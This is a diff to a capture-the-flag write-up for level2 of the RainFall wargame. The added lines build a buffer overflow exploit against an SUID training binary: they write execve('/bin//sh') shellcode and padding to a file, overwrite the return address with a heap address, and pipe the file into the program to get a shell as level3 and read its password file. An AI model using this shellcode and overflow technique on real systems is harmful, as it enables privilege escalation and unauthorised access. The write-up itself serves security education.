@@ -6,7 +6,7 @@ Buffer overflow
 
 ## Context
 
-We find a binary with owner ```level3``` and suid set.
+We find a binary with owner ```level3``` and SUID.
 ```
 level2@RainFall:~$ ls -l
 -rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
@@ -86,15 +86,31 @@ Let's create the assembly code to do this, and break it down into bytecode.
 | 68 2f 2f 73 68 | push   0x68732f2f     | push  '//sh'          | after 3rd push instruction, stack contains:  |
 | 68 2f 62 69 6e | push   0x6e69622f     | push  '/bin'          | db '/bin//sh',0,0,0,0                        |
 | 31 c0          | xor    eax,eax        | xor   eax, eax        |                                              |
-| b0 0b          | mov    al,0xb         | mov   al, 11          | execve syscall number from unistd            |
+| b0 0b          | mov    al,0xb         | mov   al, 11          | execve syscall                               |
 | 89 e3          | mov    ebx,esp        | mov   ebx, esp        | execve 1st parameter = executable (on stack) |
 | 83 e4 f0       | and    esp,0xfffffff0 | and   esp, 0xfffffff0 | align stack                                  |
 | cd 80          | int    0x80           | int   0x80            | syscall                                      |
 +----------------+-----------------------+-----------------------+----------------------------------------------+
 ```
-For ease lets's use python to echo our shell code, adding backslash ```\x```
+Lets create our exploit file, starting with our malicious shellcode, adding backslash ```\x``` to write as bytes.
 ```
-\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80
+level2@RainFall:~$ echo -e -n "\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80" > /tmp/level2_exploit
 ```
-
-
+We then want to fill the rest of the buffer with garbage.
+```
+level2@RainFall:~$ echo -e -n "------------------------------------------------------" >> /tmp/level2_exploit
+```
+And overwrite the return address with the address of our malicious shellcode, now in the heap.
+```
+level2@RainFall:~$ echo -e -n "\x08\xa0\x04\x08" >> /tmp/level2_exploit
+```
+Pipe the exploit into ./level2 stdin. This opens a shell as user ```level3```, where we can cat the level3 password.
+```
+level2@RainFall:~$ cat /tmp/level2_exploit - | ./level2
+[press enter]
+...
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
